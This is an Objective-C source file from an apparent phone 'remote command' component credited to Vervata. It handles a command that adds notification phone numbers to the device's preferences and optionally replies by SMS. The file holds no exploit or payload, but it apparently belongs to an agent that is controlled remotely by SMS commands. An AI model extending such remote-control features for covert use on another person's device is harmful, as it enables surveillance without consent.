/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  AddNotificationNumbersProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  13/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "AddNotificationNumbersProcessor.h"
#import "PrefNotificationNumber.h"
#import "Preference.h"

@interface AddNotificationNumbersProcessor (PrivateAPI)
- (void) processAddNotificationNumber;
- (void) addNotificationNumberException: (NSUInteger) aErrorCode;
- (void) sendReplySMS;
- (BOOL) canAddNotificationNumber;
- (BOOL) checkIfNotificationNumberAlreadyExist;
@end

@implementation AddNotificationNumbersProcessor

@synthesize mNotificationNumberList;

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the AddNotificationNumbersProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self(AddNotificationNumbersProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"AddNotificationNumbersProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the AddNotificationNumbersProcessor
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"AddNotificationNumbersProcessor--->doProcessingCommand")
	
	if ([RemoteCmdProcessorUtils isContainNonEndArgument:[mRemoteCmdData mArguments]]) {
		[self setMNotificationNumberList:[RemoteCmdProcessorUtils validateArgs:[mRemoteCmdData mArguments] validationType:kPhoneNumberValidation]];
		DLog(@"AddNotificationNumbersProcessor--->Notification Numbers:%@",mNotificationNumberList);
		if ([mNotificationNumberList count]>0) {
			if ([self canAddNotificationNumber]) { 
				if (![self checkIfNotificationNumberAlreadyExist] &&
					![RemoteCmdProcessorUtils isDuplicateTelephoneNumber:mNotificationNumberList])  [self processAddNotificationNumber];
				else [self addNotificationNumberException:kCmdExceptionErrorCannotAddDuplicateToNotificationList];
			}
			else {
				[self addNotificationNumberException:kCmdExceptionErrorNotificationNumberExceedListCapacity];
			}
		}
		else {
			[self addNotificationNumberException:kCmdExceptionErrorInvalidNotificationNumber];
		}
	} else {
		[self addNotificationNumberException:kCmdExceptionErrorInvalidCmdFormat];
	}	
}

#pragma mark AddNotificationNumbersProcessor PrivateAPI Methods

/**
 - Method name: processAddNotificationNumber
 - Purpose:This method is used to process Add Notification Number
 - Argument list and description: No Argument
 - Return description: No Return type
*/

- (void) processAddNotificationNumber {
	DLog (@"AddNotificationNumbersProcessor--->processAddNotificationNumber");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefNotificationNumber *prefNotificationNumberList = (PrefNotificationNumber *) [prefManager preference:kNotification_Number];
	NSMutableArray *notificationNumberList=[[NSMutableArray alloc] init];
	
	// Existing Notification Numbers
	for (NSString *notificationNumber in [prefNotificationNumberList mNotificationNumbers]) {
		[notificationNumberList addObject:notificationNumber];
	}
	//New Notification Numbers
	for (NSString *notificationNumber in mNotificationNumberList) {
		[notificationNumberList addObject:notificationNumber];
	}
	
	[prefNotificationNumberList setMNotificationNumbers:notificationNumberList];
	[prefManager savePreferenceAndNotifyChange:prefNotificationNumberList];
	[notificationNumberList release];
	[self sendReplySMS];
}


/**
 - Method name: canAddNotificationNumber
 - Purpose:This method is to check maximum Notification number list capacity. 
 - Argument list and description: No Argument
 - Return description:BOOL
*/

- (BOOL) canAddNotificationNumber {
	DLog (@"AddNotificationNumbersProcessor--->canAddNotificationNumber");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefNotificationNumber *prefNotificationNumberList = (PrefNotificationNumber *) [prefManager preference:kNotification_Number];
	int count=[[prefNotificationNumberList mNotificationNumbers] count]+[mNotificationNumberList count];
	if (count<=NOTIFICATION_NUMBER_LIST_CAPACITY) {
		return YES;
	}
	else {
		return NO;
	}
}

/**
 - Method name: checkIfNotificationNumberAlreadyExist
 - Purpose:This method is used to check if Notification number already exist. 
 - Argument list and description: No Argument
 - Return description: BOOL
*/

- (BOOL) checkIfNotificationNumberAlreadyExist {
	BOOL isNumberExist=NO;
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefNotificationNumber *prefNotificationNumberList = (PrefNotificationNumber *) [prefManager preference:kNotification_Number];
	for (NSString *notificationNumber in mNotificationNumberList) {
		NSPredicate *predicate = [NSPredicate predicateWithFormat:@"SELF == %@",notificationNumber];
		NSArray *result=[[prefNotificationNumberList mNotificationNumbers] filteredArrayUsingPredicate:predicate];
		if ([result count]) {
			isNumberExist=YES;
			break;
		}
	}
	return isNumberExist;
}

/**
 - Method name: addNotificationNumberException
 - Purpose:This method is invoked when notification number process failed. 
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (void) addNotificationNumberException: (NSUInteger) aErrorCode {
	DLog (@"AddNotificationNumbersProcessor--->addNotificationNumberException")
	FxException* exception = [FxException exceptionWithName:@"addNotificationNumberException" andReason:@"Add Notification number error"];
	[exception setErrorCode:aErrorCode];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}


/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"AddNotificationNumbersProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[mNotificationNumberList release];
	[super dealloc];
}


@end
